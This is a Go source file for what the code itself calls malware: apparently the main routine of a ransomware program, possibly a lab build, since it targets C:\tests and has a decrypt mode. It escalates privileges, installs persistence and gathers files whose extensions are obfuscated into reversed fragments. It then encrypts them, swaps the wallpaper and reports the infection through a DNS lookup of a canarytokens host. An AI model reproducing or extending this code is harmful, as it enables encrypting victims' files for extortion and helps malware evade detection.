package main

import (
	"fmt"
	"net"
	"os"
	"os/user"
	"strings"

	"ase/encrypt"
	"ase/escalate"
	"ase/utils"
)

func main() {

	// Get the current executable path
	exe, err := os.Executable()
	if err != nil {
		fmt.Println("Error: ", err)
	}

	// Check if the current process has admin privileges
	if !escalate.CheckElevate() {
		// Check if there is any argument
		if len(os.Args) > 1 {
			// Check if the argument is equal to "decrypt"
			if os.Args[1] == "--decrypt" {
				exe += " --decrypt"
			}
		}
		escalate.Escalate(exe)
	} else {

		// Get the current user
		user, _ := user.Current()
		username := strings.Split(user.Username, "\\")[1]

		var path string = `C:\tests`

		bad_extensions := make([]string, 0)
		bad_extensions = append(bad_extensions, "g"+"v"+"s")
		bad_extensions = append(bad_extensions, string([]rune{'g', 'n', 'p'}))
		bad_extensions = append(bad_extensions, "g"+"p"+"j")
		bad_extensions = append(bad_extensions, "g"+"e"+"p"+"j")
		bad_extensions = append(bad_extensions, "f"+"i"+"g")
		bad_extensions = append(bad_extensions, "p"+"m"+"b")
		bad_extensions = append(bad_extensions, "f"+"f"+"i"+"t")
		bad_extensions = append(bad_extensions, "p"+"b"+"e"+"w")
		bad_extensions = append(bad_extensions, "x"+"c"+"o"+"d")
		bad_extensions = append(bad_extensions, "t"+"p"+"p")
		bad_extensions = append(bad_extensions, "t"+"x"+"t")

		// Check if there is any argument
		if len(os.Args) > 1 {
			// Check if the argument is equal to "decrypt"
			if os.Args[1] == "--decrypt" {
				encrypt.StartDecrypt(path)
			} else {
				fmt.Println("Invalid argument")
				return
			}
		} else {

			utils.SkullArt()

			// Making the malware persistent
			fmt.Println("[+] Making the malware persistent...")
			err := utils.MakePersistent(exe)
			if err != nil {
				fmt.Println("Error: ", err)
				os.Exit(1)
			}

			fmt.Println("[+] Discovering files...")
			files, err := utils.DiscoverDisk(path, bad_extensions)
			if err != nil {
				fmt.Println("Error: ", err)
				os.Exit(1)
			}

			// Encrypt the files
			fmt.Println("[+] Encrypting your files now...")
			encrypt.StartEncrypt(path, files)

			// Print the number of files found
			fmt.Println("[+] Found", len(files), "files")

			// Download the wallpaper
			fmt.Println("[+] Downloading the new beloved wallpaper...")
			utils.Wallpaper(username)

			// Report that a computer has been infected
			fmt.Println("[+] Reporting that this computer has been infected...")
			hostname := "vww1my6o1onk2870byrcsztzr.canarytokens.com"
			_, err = net.LookupHost(hostname)
			if err != nil {
				fmt.Println("Error: ", err)
				os.Exit(1)
			}
		}
	}

}
